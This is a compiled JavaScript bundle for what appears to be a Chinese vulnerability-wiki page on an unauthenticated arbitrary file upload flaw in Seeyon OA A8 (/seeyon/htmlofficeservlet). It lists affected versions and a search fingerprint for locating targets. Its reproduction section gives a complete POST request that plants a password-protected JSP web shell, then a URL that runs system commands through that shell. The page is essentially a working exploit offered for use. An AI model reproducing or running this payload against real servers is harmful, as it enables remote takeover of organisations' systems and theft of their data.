(window.webpackJsonp=window.webpackJsonp||[]).push([[242],{1830:function(e,a,t){e.exports=t.p+"assets/img/zhiyuan-1.5dce0799.png"},1831:function(e,a,t){e.exports=t.p+"assets/img/zhiyuan-2.33593185.png"},1832:function(e,a,t){e.exports=t.p+"assets/img/zhiyuan-3.a5c236a0.png"},3250:function(e,a,t){"use strict";t.r(a);var s=t(63),r=Object(s.a)({},(function(){var e=this,a=e._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"致远oa-a8-htmlofficeservlet-任意文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#致远oa-a8-htmlofficeservlet-任意文件上传漏洞"}},[e._v("#")]),e._v(" 致远OA A8 htmlofficeservlet 任意文件上传漏洞")]),e._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),a("p",[e._v("该漏洞最早于6月26号左右，有安全厂商发出漏洞预警。")]),e._v(" "),a("p",[e._v("远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。")]),e._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[e._v("#")]),e._v(" 网络测绘")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v('title="致远A8-V5协同管理软件 V6.1sp1"')]),a("br"),e._v(" "),a("h2",{attrs:{id:"影响版本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[e._v("#")]),e._v(" 影响版本")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("致远A8-V5协同管理软件V6.1sp1")]),a("br"),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3")]),a("br"),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("致远A8+协同管理软件V7.1")]),a("br"),e._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),a("p",[e._v("访问目标站点")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("/seeyon/htmlofficeservlet\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])]),a("p",[e._v("出现如下图响应，则可能含有漏洞")]),e._v(" "),a("p",[a("img",{attrs:{src:t(1830),alt:"img"}})]),e._v(" "),a("p",[e._v("使用POST请求发出如下请求包")]),e._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[e._v('DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\nOPTION=S3WYOSWLBSGr\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\nCREATEDATE=wUghPB3szB3Xwg66\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\noriginalFileId=wV66\noriginalCreateDate=wUghPB3szB3Xwg66\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\nneedReadFile=yRWZdAS6\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\n<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("calsee".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("\n<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>>a6e4f045d4b8506bf492ada7e3390d7ce\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br"),a("span",{staticClass:"line-number"},[e._v("4")]),a("br"),a("span",{staticClass:"line-number"},[e._v("5")]),a("br"),a("span",{staticClass:"line-number"},[e._v("6")]),a("br"),a("span",{staticClass:"line-number"},[e._v("7")]),a("br"),a("span",{staticClass:"line-number"},[e._v("8")]),a("br"),a("span",{staticClass:"line-number"},[e._v("9")]),a("br"),a("span",{staticClass:"line-number"},[e._v("10")]),a("br"),a("span",{staticClass:"line-number"},[e._v("11")]),a("br"),a("span",{staticClass:"line-number"},[e._v("12")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1831),alt:"img"}})]),e._v(" "),a("p",[e._v("出现如图响应则为上传成功,访问")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1832),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);